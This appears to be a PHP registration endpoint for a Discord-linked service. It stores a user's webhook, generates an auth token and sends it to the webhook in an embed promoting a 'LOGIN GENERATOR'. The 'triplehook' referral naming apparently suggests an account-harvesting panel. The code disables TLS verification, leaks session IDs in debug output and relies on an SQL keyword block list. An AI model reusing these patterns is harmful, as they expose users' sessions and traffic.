<?php
if (session_status() === PHP_SESSION_NONE) {
    $sessionLifetime = 365 * 24 * 60 * 60;
    $secure = (
        (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ||
        (($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '') === 'https')
    );
    $validSessionIdPattern = '/^[A-Za-z0-9,-]{16,128}$/';
    $validSessionNamePattern = '/^[A-Za-z][A-Za-z0-9_]{0,63}$/';
    $sessionCookieNames = ['token', 'PHPSESSID'];

    foreach (array_keys($_COOKIE) as $cookieName) {
        if (
            !in_array($cookieName, $sessionCookieNames, true) &&
            preg_match($validSessionNamePattern, (string) $cookieName) &&
            !empty($_COOKIE[$cookieName]) &&
            preg_match($validSessionIdPattern, (string) $_COOKIE[$cookieName])
        ) {
            $sessionCookieNames[] = $cookieName;
        }
    }

    $selectedSessionName = 'token';

    foreach ($sessionCookieNames as $candidateName) {
        if (
            !empty($_COOKIE[$candidateName]) &&
            preg_match($validSessionIdPattern, (string) $_COOKIE[$candidateName])
        ) {
            $selectedSessionName = $candidateName;
            break;
        }
    }

    session_name($selectedSessionName);
    ini_set('session.gc_maxlifetime', (string) $sessionLifetime);
    ini_set('session.use_strict_mode', '1');
    ini_set('session.use_only_cookies', '1');

    if (PHP_VERSION_ID >= 70300) {
        session_set_cookie_params([
            'lifetime' => $sessionLifetime,
            'path' => '/',
            'secure' => $secure,
            'httponly' => true,
            'samesite' => 'Lax'
        ]);
    } else {
        session_set_cookie_params($sessionLifetime, '/', '', $secure, true);
    }

    session_start();

    $hasDiscordSession = function () {
        return (
            !empty($_SESSION['discord_authenticated']) ||
            !empty($_SESSION['discord_user_id']) ||
            !empty($_SESSION['discord_username']) ||
            !empty($_SESSION['triplehook_referrer']) ||
            !empty($_SESSION['triplehook_directory']) ||
            !empty($_SESSION['auth_code']) ||
            !empty($_SESSION['link_id'])
        );
    };

    if (!$hasDiscordSession()) {
        $originalSessionName = session_name();
        $originalSessionId = session_id();

        foreach ($sessionCookieNames as $fallbackName) {
            if (
                $fallbackName === session_name() ||
                empty($_COOKIE[$fallbackName]) ||
                !preg_match($validSessionIdPattern, (string) $_COOKIE[$fallbackName])
            ) {
                continue;
            }

            session_write_close();
            session_name($fallbackName);
            session_id((string) $_COOKIE[$fallbackName]);
            session_start();

            if ($hasDiscordSession()) {
                break;
            }
        }

        if (!$hasDiscordSession() && $originalSessionId !== '') {
            session_write_close();
            session_name($originalSessionName);
            session_id($originalSessionId);
            session_start();
        }
    }

    if (!headers_sent() && session_id() !== '' && $hasDiscordSession()) {
        if (PHP_VERSION_ID >= 70300) {
            setcookie('token', session_id(), [
                'expires' => time() + $sessionLifetime,
                'path' => '/',
                'secure' => $secure,
                'httponly' => true,
                'samesite' => 'Lax'
            ]);
        } else {
            setcookie('token', session_id(), time() + $sessionLifetime, '/', '', $secure, true);
        }

        $_COOKIE['token'] = session_id();
    }
}
header('Content-Type: application/json; charset=UTF-8');

include_once '../libs/configuration.php';
/* ---- functions this file uses (formerly from libs/functions.php, which is no longer needed) ---- */
if (!function_exists('sendEmbed')) {
function sendEmbed($webhook, $embed){
    if (empty($webhook)) {
        error_log("sendEmbed ERROR: Webhook URL is empty!");
        return false;
    }
    
    error_log("sendEmbed: Sending to webhook: " . substr($webhook, 0, 50) . "...");
    
    $embedJson = json_encode($embed);
    
    if (json_last_error() !== JSON_ERROR_NONE) {
        error_log("sendEmbed ERROR: JSON encode failed: " . json_last_error_msg());
        return false;
    }
    
    $ch = curl_init($webhook);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
    curl_setopt($ch, CURLOPT_POSTFIELDS, $embedJson);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Content-Type: application/json",
        "Content-Length: " . strlen($embedJson)
    ]);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    error_log("sendEmbed: HTTP Code: " . $httpCode);
    
    if ($error) {
        error_log("sendEmbed CURL ERROR: " . $error);
        return false;
    }
    
    if ($httpCode === 204 || $httpCode === 200) {
        error_log("sendEmbed: SUCCESS");
        return 'success';
    }
    
    if ($httpCode !== 200 && $httpCode !== 204) {
        error_log("sendEmbed HTTP ERROR: Code " . $httpCode . " Response: " . $response);
        return false;
    }
    
    return $response ?: 'success';
}
}
if (!function_exists('getRandomNumber')) {
function getRandomNumber($length) {
    if ($length < 1) {
        return ''; // Return an empty string for invalid lengths
    }

    // Generate a random number as a string
    $randomNumber = '';
    for ($i = 0; $i < $length; $i++) {
        $randomNumber .= mt_rand(0, 9); // Append a random digit (0-9)
    }

    return $randomNumber; // Return the random number as a string
}
}
if (!function_exists('stringExistsInRow')) {
function stringExistsInRow($table, $column, $rowKeyColumn, $rowKeyValue) {
    static $db = null;   // one database connection for the whole page (was: a new one for every query)
    if ($db === null) {
        include $_SERVER['DOCUMENT_ROOT'] . '/libs/connection.php';
    }
    
    // Validate inputs
    $validFields = [$table, $column, $rowKeyColumn];
    foreach ($validFields as $field) {
        if (!preg_match('/^[a-zA-Z0-9_]+$/', $field)) {
            throw new Exception("Invalid table or column name");
        }
    }

    try {
        $stmt = $db->prepare("SELECT $column FROM `$table` 
                            WHERE `$rowKeyColumn` = :key_value");
        $stmt->bindParam(':key_value', $rowKeyValue, PDO::PARAM_STR);
        $stmt->execute();
        return $stmt->rowCount() > 0;
    } catch (PDOException $e) {
        error_log("Database error: " . $e->getMessage());
        return false;
    }
}
}
if (!function_exists('executeSafeQuery')) {
function executeSafeQuery($sql, $params = []) {
    static $db = null;   // one database connection for the whole page (was: a new one for every query)
    if ($db === null) {
        include $_SERVER['DOCUMENT_ROOT'] . '/libs/connection.php';
    }
    
    // Block suspicious keywords (customize based on your needs)
$blockedKeywords = ['DROP TABLE', 'DELETE FROM', 'TRUNCATE TABLE', 'GRANT ', 'ALTER TABLE', 'CREATE TABLE', 'CREATE DATABASE'];
	foreach ($blockedKeywords as $keyword) {
        if (stripos($sql, $keyword) !== false) {
            throw new Exception("Suspicious SQL operation detected");
        }
    }

    try {
        $stmt = $db->prepare($sql);
        
        // Bind parameters securely
        foreach ($params as $key => $value) {
            $stmt->bindValue(is_int($key) ? $key + 1 : $key, $value, 
                is_int($value) ? PDO::PARAM_INT : PDO::PARAM_STR);
        }
        
        $stmt->execute();
        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    } catch (PDOException $e) {
        error_log("Database error: " . $e->getMessage());
        return [];
    }
}
}
/* ---- end of the functions from libs/functions.php ---- */
include_once '../libs/connection.php';

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(['success' => false, 'error' => 'Invalid method', 'debug' => 'Only POST requests allowed']);
    exit;
}

if (!isset($_SESSION['discord_authenticated'])) {
    echo json_encode([
        'success' => false,
        'error' => 'Authentication required',
        'debug' => 'discord_authenticated session not found',
        'session_keys' => array_keys($_SESSION),
        'session_id' => session_id()
    ]);
    exit;
}

$input = json_decode(file_get_contents('php://input'), true);
$webhook = $input['webhook'] ?? null;
$directory = $input['directory'] ?? null;

if (!$webhook) {
    echo json_encode(['success' => false, 'error' => 'No webhook', 'debug' => 'webhook field missing from POST body']);
    exit;
}

function validateWebhook($webhookUrl) {
    if (!preg_match('/^https:\/\/(discord\.com|discordapp\.com)\/api\/webhooks\/\d+\/[\w-]+$/', $webhookUrl)) {
        return ['valid' => false, 'reason' => 'Regex mismatch - URL format invalid'];
    }
    
    $ch = curl_init($webhookUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $response = curl_exec($ch);
    $curlError = curl_error($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    if ($curlError) {
        return ['valid' => false, 'reason' => 'cURL error: ' . $curlError];
    }
    if ($httpCode !== 200) {
        return ['valid' => false, 'reason' => 'Discord returned HTTP ' . $httpCode];
    }
    $data = json_decode($response, true);
    if (!$data || !isset($data['id']) || !isset($data['token'])) {
        return ['valid' => false, 'reason' => 'Discord response missing id or token fields'];
    }
    return ['valid' => true, 'reason' => 'OK'];
}

$webhookCheck = validateWebhook($webhook);
if (!$webhookCheck['valid']) {
    echo json_encode(['success' => false, 'error' => 'Webhook is invalid or inactive', 'debug' => $webhookCheck['reason']]);
    exit;
}

try {
    $discord_id = $_SESSION['discord_user_id'] ?? null;
    $discord_username = $_SESSION['discord_username'] ?? null;
    $discord_avatar = $_SESSION['discord_avatar'] ?? '';
    $referredBy = $_SESSION['triplehook_referrer'] ?? null;

    if (!$discord_id || !$discord_username) {
        throw new Exception('Session missing: discord_user_id=' . ($discord_id ?? 'NULL') . ', discord_username=' . ($discord_username ?? 'NULL'));
    }
    
    $dbConnection = $pdo ?? $db ?? null;
    
    if (!$dbConnection) {
        $debugInfo = 'pdo=' . (isset($pdo) ? get_class($pdo) : 'undefined') . ', db=' . (isset($db) ? get_class($db) : 'undefined');
        throw new Exception('Database connection failed - ' . $debugInfo);
    }

    $checkStmt = $dbConnection->prepare("SELECT auth_code, link_id FROM regular WHERE discord_id = ? LIMIT 1");
    $checkStmt->execute([$discord_id]);
    $existing = $checkStmt->fetch(PDO::FETCH_ASSOC);
    
    if ($existing && !empty($existing['auth_code'])) {
        $_SESSION['auth_code'] = $existing['auth_code'];
        $_SESSION['link_id'] = $existing['link_id'];
        $_SESSION['triplehook'] = 'False';
        
        $updateStmt = $dbConnection->prepare("UPDATE regular SET webhook = ?, discord_username = ?, discord_avatar = ?, last_login = NOW(), referred_by = COALESCE(referred_by, ?) WHERE discord_id = ?");
        $updateResult = $updateStmt->execute([$webhook, $discord_username, $discord_avatar, $referredBy, $discord_id]);
        $updatedRows = $updateStmt->rowCount();

        if (!$updateResult) {
            throw new Exception('UPDATE failed: ' . implode(' | ', $updateStmt->errorInfo()));
        }
        
        unset($_SESSION['discord_authenticated']);
        unset($_SESSION['triplehook_referrer']);
        unset($_SESSION['triplehook_directory']);
        
        echo json_encode([
            'success' => true,
            'debug' => 'Existing user updated',
            'updated_rows' => $updatedRows,
            'discord_id' => $discord_id
        ]);
        exit;
    }

    $webhookExists = stringExistsInRow('regular', 'auth_code', 'webhook', $webhook);
    if ($webhookExists) {
        throw new Exception('Webhook already active - this webhook is registered to another account');
    }

    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $token = '';
    for ($i = 0; $i < 100; $i++) {
        $token .= $chars[random_int(0, 35)];
    }
    $token .= '-tkn';

    $linkIdAttempts = 0;
    do {
        $linkId = random_int(100000000000, 999999999999);
        $exists = stringExistsInRow('regular', 'link_id', 'link_id', $linkId);
        $linkIdAttempts++;
        if ($linkIdAttempts > 50) {
            throw new Exception('Could not generate unique link_id after 50 attempts');
        }
    } while ($exists);

    $insertQuery = "INSERT INTO regular 
        (user_id, auth_code, discord_id, discord_username, discord_avatar, last_login, link_id, privateServerLinkCode, webhook, referred_by) 
        VALUES 
        (:user_id, :auth_code, :discord_id, :discord_username, :discord_avatar, NOW(), :link_id, :privateServerLinkCode, :webhook, :referred_by)";
    
    $params = [
        ':user_id' => 1,
        ':auth_code' => $token,
        ':discord_id' => $discord_id,
        ':discord_username' => $discord_username,
        ':discord_avatar' => $discord_avatar,
        ':link_id' => $linkId,
        ':privateServerLinkCode' => getRandomNumber(32),
        ':webhook' => $webhook,
        ':referred_by' => $referredBy
    ];

    $result = executeSafeQuery($insertQuery, $params);
    if ($result === false) {
        throw new Exception('INSERT failed - executeSafeQuery returned false. Params: discord_id=' . $discord_id . ', link_id=' . $linkId);
    }

    $embedName = $website['name'];
    $embedThumbnail = 'https://cdn.discordapp.com/attachments/1464597073549852765/1465827671865954324/ssb4-master-shadow-pikachu-png-clipart-removebg-preview.png?ex=697a85e6&is=69793466&hm=f51b8911ab88fbb654550238715ff579756946c85acc3996fd480403ac3aa44f&';
    $embedDomain = 'app.ultima.cl';
    
    if (!empty($referredBy)) {
        try {
            $tripStmt = $dbConnection->prepare("SELECT display_name, thumbnail_url FROM triplehook_data WHERE link_id = :link_id LIMIT 1");
            $tripStmt->execute([':link_id' => $referredBy]);
            $tripData = $tripStmt->fetch(PDO::FETCH_ASSOC);
            
            if ($tripData) {
                if (!empty($tripData['display_name'])) {
                    $embedName = $tripData['display_name'];
                }
                if (!empty($tripData['thumbnail_url'])) {
                    $embedThumbnail = $tripData['thumbnail_url'];
                }
                $embedDomain = $triplehook[0];
            }
        } catch (Exception $e) {
            // triplehook_data lookup failed but not critical
        }
    }
    
    $embedData = [
        'content' => '',
        'tts' => false,
        'embeds' => [
            [
                'author' => [
                    'name' => 'TOKEN INFORMATION'
                ],
                'description' => "Secret Code / Auth\n```$token```\nYou can easily access your account with this token.",
                'color' => 13111312,
                'thumbnail' => [
                    'url' => 'https://cdn.discordapp.com/attachments/1465312216008888476/1465820612374171688/images__6_-removebg-preview.png?ex=697a7f53&is=69792dd3&hm=fad30875af9b7937c3a54bc25c7dd016fd5e46b849d3737b74bacf31e0fc8a8c&'
                ]
            ],
            [
                'title' => 'Welcome To ' . $embedName,
                'description' => "**We are ready to serve you with the latest updates. has been released as of \nnow. Thank you for choosing us for more money and more power. I believe \nwe will grow even bigger very soon.**\n\n[**[ LOGIN GENERATOR ]**](https://" . $embedDomain . "/pages/login?token=$token)",
                'thumbnail' => [
                    'url' => $embedThumbnail
                ]
            ]
        ],
        'username' => $embedName,
        'avatar_url' => $website['thumbnail'],
        'attachments' => []
    ];

    sendEmbed($webhook, $embedData);

    $_SESSION['auth_code'] = $token;
    $_SESSION['link_id'] = $linkId;
    $_SESSION['triplehook'] = 'False';
    
    unset($_SESSION['discord_authenticated']);
    unset($_SESSION['triplehook_referrer']);
    unset($_SESSION['triplehook_directory']);
    
    echo json_encode([
        'success' => true,
        'debug' => 'New user created',
        'discord_id' => $discord_id,
        'link_id' => $linkId
    ]);
    
} catch (Exception $e) {
    echo json_encode([
        'success' => false,
        'error' => $e->getMessage(),
        'debug' => 'Exception at line ' . $e->getLine() . ' in ' . basename($e->getFile())
    ]);
}